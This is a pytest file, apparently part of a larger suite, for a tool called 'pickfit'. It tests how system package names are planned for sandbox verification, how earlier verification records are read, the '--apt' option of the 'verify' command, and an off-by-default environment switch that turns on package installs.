    assert planned_names(ex(), readme=readme, earlier_reason="needs_root",
                         earlier_error="libxcb.so.1: cannot open shared object file") == (
        "libxcb1", "libxkbcommon-dev", "libasound2-dev")
    # Never the tool itself, never what the box has, never more than the cap.
    hurl = ex(manual_steps=[cited("Install with apt", "sudo apt install hurl curl jq")])
    assert planned_names(hurl, own_names=("hurl", "Hurl")) == ("jq",)
    many = ex(pre={"system_packages": [cited(f"lib{i}-dev", "x") for i in range(20)]})
    assert len(planned_names(many)) == sysdeps.MAX_PLANNED


def test_the_earlier_attempt_is_read_from_the_record(tmp_path: Path) -> None:
    def record_with(runs: list[dict[str, Any]]) -> None:
        (tmp_path / "tool.json").write_text(json.dumps({"verification": {"runs": runs}}), encoding="utf-8")

    assert earlier_attempt(tmp_path, "tool") == (None, None) and earlier_attempt(None, "tool") == (None, None)
    record_with([{"os": "linux", "method": "sandbox", "unverified_reason": "needs_root",
                  "blocking_error": "E: are you root?"},
                 {"os": "macos", "method": "sandbox", "unverified_reason": None}])
    assert earlier_attempt(tmp_path, "tool") == ("needs_root", "E: are you root?")
    record_with([{"os": "linux", "method": "sandbox", "unverified_reason": None,
                  "features": [{"status": "not_checked", "reason": "needs_root"}]}])
    assert earlier_attempt(tmp_path, "tool") == ("needs_root", None)
    record_with([{"os": "linux", "method": "sandbox", "unverified_reason": None, "features": []}])
    assert earlier_attempt(tmp_path, "tool") == (None, None)
    (tmp_path / "broken.json").write_text("{", encoding="utf-8")
    assert earlier_attempt(tmp_path, "broken") == (None, None)


def test_the_verify_command_takes_packages_by_name() -> None:
    import argparse

    from pickfit.verify import cli

    parser = argparse.ArgumentParser()
    cli.add_parser(parser.add_subparsers())

    def make(run_id: str, role: str) -> None:
        return None

    args = parser.parse_args(["verify", "--fixture", "x.json", "--apt", "libxcb1", "--apt", "jq"])
    boxes = cli._packaged(args, make)
    assert isinstance(boxes, PackagedBoxes) and boxes.names == ("libxcb1", "jq")
    assert cli._packaged(parser.parse_args(["verify", "--fixture", "x.json"]), make) is make


def test_the_plan_side_installs_are_off_until_switched_on(monkeypatch: pytest.MonkeyPatch) -> None:
    """Opt-in (念誠, 11/21): the watch installs a plan's packages only with PICKFIT_SYSDEPS=1, until a real box has
    shown that apt works. --apt and the probe do not read the switch (the test above this one)."""
    monkeypatch.delenv(sysdeps.ENABLED_ENV, raising=False)
    assert not sysdeps.enabled()
    for value, on in (("1", True), (" 1 ", True), ("0", False), ("", False), ("true", False), ("yes", False)):
        monkeypatch.setenv(sysdeps.ENABLED_ENV, value)
        assert sysdeps.enabled() is on, value
